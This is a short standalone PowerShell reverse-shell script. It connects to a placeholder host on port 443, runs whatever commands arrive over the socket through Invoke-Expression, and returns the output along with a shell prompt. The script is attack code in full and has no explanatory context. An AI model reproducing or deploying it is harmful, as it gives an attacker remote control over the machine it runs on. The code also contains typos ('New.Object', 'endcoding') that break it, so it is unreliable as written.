$client = New-Object System.Net.Sockets.TcpClient("IP_ADDRESS", 443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New.Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)   
    $sendback = (iex $data 2>&1 | Out-string);
    $sendback2 = $sendback + "PS" + (pwd).Path + "> ";
    $sendbyte = ([text.endcoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();